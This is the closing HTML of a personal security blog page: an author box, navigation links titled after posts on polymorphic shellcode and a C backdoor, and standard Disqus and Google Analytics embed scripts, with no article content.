        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
        <h4 class="section-title author-name">mh4x0f</h4>
        <p class="author-bio">One 0x41414141 worth a thousand words</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/shellcode/2014/08/06/Shellcode-Polimorficos-chamdos-Motor-polymorphic.html" title="Shellcode Polimorficos chamdos Motor polymorphic">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/c%20programming/2014/08/07/writing-backdoor-in-C-sockets-berkeley%20%5BUNIX%5D-0xc6.html" title="writing backdoor in C sockets berkeley [UNIX] 0xc6">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>



    
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'mh4x0fblog';

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>





		<footer>
			<hr/>
			<p>
				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  var _gaq = _gaq || [];
  var pluginUrl =
 '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
  _gaq.push(['_setAccount', 'mh4x0f']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

